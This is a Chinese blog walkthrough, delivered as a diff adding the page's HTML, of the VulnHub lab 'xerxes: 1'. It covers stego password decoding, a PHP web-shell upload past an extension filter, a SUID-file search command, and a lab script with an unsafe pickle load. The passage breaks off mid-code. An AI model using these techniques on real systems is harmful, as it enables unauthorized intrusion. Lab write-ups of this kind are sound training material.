@@ -1,0 +1,665 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub xerxes：1 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="xerxes: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;xerxes&#x2F;xerxes.tar.gz 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  80 端口  目录扫描到一个文件上传，但是没有密码  CTFRGBA 颜色解密点击忘记密码拿到一个二维码  在线网站扫描拿到一段字符串  Base6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub xerxes：1">
+<meta property="og:url" content="http://example.com/2026/04/01/xerxes%201/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="xerxes: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;xerxes&#x2F;xerxes.tar.gz 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  80 端口  目录扫描到一个文件上传，但是没有密码  CTFRGBA 颜色解密点击忘记密码拿到一个二维码  在线网站扫描拿到一段字符串  Base6">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6988a26f956625ad53577fe6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfa148b2d4ec3cdd890d3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfbed8b2d4ec3cdd89214.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfbb68b2d4ec3cdd89205.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfc2d8b2d4ec3cdd89279.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfd568b2d4ec3cdd89365.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfdaf8b2d4ec3cdd893a9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bffb669f3169ba02ccbbd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698bfffc69f3169ba02ccbef.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c006a69f3169ba02ccc1b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c026869f3169ba02ccd3d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c057569f3169ba02ccfc4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c066e69f3169ba02cd0b5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c06a169f3169ba02cd0e3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c06c669f3169ba02cd118.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c06fc69f3169ba02cd134.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c1dba69f3169ba02cd8ac.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c1e7569f3169ba02cd8fe.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c317217402bfe3bc80941.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c34fc13218ae1b176c145.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c357713218ae1b176c14a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698c365013218ae1b176c152.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698d80e41d67521e9b484749.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698d818ac46878ce9faee0cd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/698d8475c46878ce9faee1cb.png">
+<meta property="article:published_time" content="2026-04-01T08:16:00.000Z">
+<meta property="article:modified_time" content="2026-04-01T09:05:52.467Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6988a26f956625ad53577fe6.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub xerxes：1">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub xerxes：1</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xerxes-1"><span class="toc-number">1.</span> <span class="toc-text">xerxes: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">1.1.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RGBA-%E9%A2%9C%E8%89%B2%E8%A7%A3%E5%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">RGBA 颜色解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload"><span class="toc-number">1.2.1.</span> <span class="toc-text">Upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.3.1.</span> <span class="toc-text">权限配置不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.2.</span> <span class="toc-text">Pickle 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.4.</span> <span class="toc-text">SSH 私钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.5.</span> <span class="toc-text">密码泄露</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-xerxes 1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-01T08:16:00.000Z" itemprop="datePublished">2026-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-04-01</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="xerxes-1"><a href="#xerxes-1" class="headerlink" title="xerxes: 1"></a>xerxes: 1</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/xerxes/xerxes.tar.gz">https://download.vulnhub.com/xerxes/xerxes.tar.gz</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/item/6988a26f956625ad53577fe6.png"></p>
+<p>80 端口</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfa148b2d4ec3cdd890d3.png"></p>
+<p>目录扫描到一个文件上传，但是没有密码</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfbed8b2d4ec3cdd89214.png"></p>
+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="RGBA-颜色解密"><a href="#RGBA-颜色解密" class="headerlink" title="RGBA 颜色解密"></a>RGBA 颜色解密</h3><p>点击忘记密码拿到一个二维码</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfbb68b2d4ec3cdd89205.png"></p>
+<p>在线网站扫描拿到一段字符串</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfc2d8b2d4ec3cdd89279.png"></p>
+<p>Base64 解码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">look deeper</span><br></pre></td></tr></table></figure>
+
+<p>放大图片发现有色块</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfd568b2d4ec3cdd89365.png"></p>
+<p>在 PS 等软件中查看颜色发现只有 A 变化</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfdaf8b2d4ec3cdd893a9.png"></p>
+<p>记录下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">75,121,115,114,75,121,115,114,87,122,52,114,75,121,115,114,75,121,115,114,75,122,119,116,88,84,52,114,75,121,115,114,76,105,115,117,76,83,48,116,76,83,52,116,76,105,52,61</span><br></pre></td></tr></table></figure>
+
+<p>转成 ASCII 码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KysrKysrWz4rKysrKysrKzwtXT4rKysrLisuLS0tLS4tLi4=</span><br></pre></td></tr></table></figure>
+
+<p>Base64 解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++[&gt;++++++++&lt;-]&gt;++++.+.----.-..</span><br></pre></td></tr></table></figure>
+
+<p>Brainfuck 解密拿到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45100</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>直接传 PHP 木马被拦截了</p>
+<p><img src="https://pic1.imgdb.cn/item/698bffb669f3169ba02ccbbd.png"></p>
+<p>改了一下后缀上传成功</p>
+<p><img src="https://pic1.imgdb.cn/item/698bfffc69f3169ba02ccbef.png"></p>
+<p>连接成功</p>
+<p><img src="https://pic1.imgdb.cn/item/698c006a69f3169ba02ccc1b.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="权限配置不当"><a href="#权限配置不当" class="headerlink" title="权限配置不当"></a>权限配置不当</h3><p>进入家目录发现 <code>amanpour</code> 用户的目录可以进去</p>
+<p><img src="https://pic1.imgdb.cn/item/698c026869f3169ba02ccd3d.png"></p>
+<p>观察历史命令</p>
+<p><img src="https://pic1.imgdb.cn/item/698c057569f3169ba02ccfc4.png"></p>
+<p>把脚本内容扔给 AI 结合命令分析</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Image, sys, getopt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">filename</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    done = <span class="number">0</span></span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> done == <span class="number">0</span>:</span><br><span class="line">        pixel = pixels[x, y]    </span><br><span class="line">        <span class="keyword">if</span> (pixel[<span class="number">3</span>] != <span class="number">255</span>):</span><br><span class="line">            message = message + <span class="built_in">chr</span>(pixel[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            done = <span class="number">1</span></span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (x == image.size[<span class="number">0</span>]):</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y = y + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">filename, message</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> image.mode != <span class="string">&#x27;RGBA&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[!] converting &quot;</span> + filename + <span class="string">&quot; to RGBA&quot;</span></span><br><span class="line">        image = image.convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> message:</span><br><span class="line">        pixel = pixels[x, y]</span><br><span class="line">        <span class="comment"># write new alpha value</span></span><br><span class="line">        pixels[x, y] = (pixel[<span class="number">0</span>], pixel[<span class="number">1</span>], pixel[<span class="number">2</span>], <span class="built_in">ord</span>(c))</span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (x == image.size[<span class="number">0</span>]):</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y = y + <span class="number">1</span></span><br><span class="line">    encodedImage = filename + <span class="string">&quot;-enc.png&quot;</span></span><br><span class="line">    image.save(encodedImage)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    mode = <span class="number">0</span> <span class="comment"># 0 = decode, 1 = encode</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;f:s:&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;steqr -f filename -s string&quot;</span></span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> opt, arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">&quot;-f&quot;</span>):</span><br><span class="line">            filename = arg</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> <span class="string">&#x27;-s&#x27;</span>:</span><br><span class="line">            string = arg</span><br><span class="line">            mode = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        encode(filename, string)</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        decode(filename)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/698c066e69f3169ba02cd0b5.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/698c06a169f3169ba02cd0e3.png"></p>
+<p>按照 AI 的结果执行阶段 6 的命令拿到一串字符</p>
+<p><img src="https://pic1.imgdb.cn/item/698c06c669f3169ba02cd118.png"></p>
+<p>结果 SSH 直接连接上去了</p>
+<p><img src="https://pic1.imgdb.cn/item/698c06fc69f3169ba02cd134.png"></p>
+<h3 id="Pickle-反序列化"><a href="#Pickle-反序列化" class="headerlink" title="Pickle 反序列化"></a>Pickle 反序列化</h3><p>查找所有有 SUID 权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现一个 <code>/opt/notes</code></p>
+<p><img src="https://pic1.imgdb.cn/item/698c1dba69f3169ba02cd8ac.png"></p>
+<p>进入到 <code>/opt</code> 目录下发现有个 <code>notes.py</code> 文件</p>
+<p><img src="https://pic1.imgdb.cn/item/698c1e7569f3169ba02cd8fe.png"></p>
+<p>查看源代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">notes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">filename</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(filename) &lt; <span class="number">1</span>:</span><br><span class="line">                filename = <span class="string">&quot;notes&quot;</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;/home/curtiz/&quot;</span> + filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        pickle.dump(notes, f)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">filename</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(filename) &lt; <span class="number">1</span>:</span><br><span class="line">                filename = <span class="string">&quot;notes&quot;</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;/home/curtiz/&quot;</span> + filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        notes = pickle.load(f)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> notes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        <span class="keyword">global</span> notes</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------------------&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot; Welcome to Juan&#x27;s to-do list! &quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;   type help for more info     &quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------------------&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                raw_cmd = raw_input()</span><br><span class="line">                cmd = raw_cmd.split()</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(cmd) &gt; <span class="number">0</span>):</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;help&quot;</span> == cmd[<span class="number">0</span>]:</span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot; Available commands:&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;   - add  [note] : add a note for Juan&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;   - show        : show to-do list&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;   - save [file] : save to-do list&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;   - load [file] : load to-do list&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;   - quit        : 